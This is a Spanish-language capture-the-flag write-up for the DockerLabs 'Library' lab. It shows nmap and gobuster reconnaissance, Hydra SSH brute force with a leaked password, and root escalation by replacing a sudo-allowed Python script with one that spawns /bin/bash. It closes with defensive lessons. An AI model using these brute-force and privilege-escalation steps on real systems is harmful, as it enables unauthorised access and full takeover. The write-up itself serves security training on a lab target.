# Library — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 13/05/2024  
**Técnicas:** Nmap · Gobuster · Hydra · SSH · Python sudo abuse · Writable script

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Fuerza bruta SSH — Hydra](#3-fuerza-bruta-ssh--hydra)
4. [Escalada de privilegios](#4-escalada-de-privilegios)
5. [Lección aprendida](#5-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh library.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Hacemos un escaneo más profundo para detectar versiones:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

Servicios identificados:

```text
OpenSSH 9.6p1 Ubuntu
Apache httpd 2.4.58
```

---

## 2. Enumeración web — Gobuster

Accedemos al servidor web y observamos la página por defecto de Apache.

Enumeramos directorios y archivos:

```bash
sudo gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt
```

Resultado interesante:

```text
/index.php
/javascript
```

Al acceder a `index.php` encontramos un posible password:

```text
JIFGHDS87GYDFIGD
```

---

## 3. Fuerza bruta SSH — Hydra

Utilizamos Hydra para descubrir un usuario válido con la contraseña encontrada.

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-p JIFGHDS87GYDFIGD \
ssh://172.17.0.2
```

Resultado:

```text
login: carlos
password: JIFGHDS87GYDFIGD
```

Accedemos por SSH:

```bash
ssh carlos@172.17.0.2
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/python3 /opt/script.py
```

---

## 4. Escalada de privilegios

Analizamos el script:

```bash
cd /opt
cat script.py
```

Contenido original:

```python
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f"Archivo copiado de {origen} a {destino}")

if __name__ == "__main__":
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

Eliminamos el script:

```bash
rm -r script.py
```

Creamos uno nuevo:

```python
import os
os.system("/bin/bash")
```

Damos permisos de ejecución:

```bash
chmod +x script.py
```

Ejecutamos el script como sudo:

```bash
sudo python3 /opt/script.py
```

Comprobamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 5. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Contraseña expuesta en aplicación web | Acceso inicial |
| Credenciales débiles SSH | Acceso remoto |
| Script Python ejecutable con sudo | Escalada de privilegios |
| Script escribible por usuario | Ejecución arbitraria |

**Para defenderse:**

- No almacenar credenciales visibles en aplicaciones web.
- Utilizar contraseñas robustas y únicas.
- Restringir permisos sobre scripts ejecutados con sudo.
- Evitar permisos NOPASSWD innecesarios.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
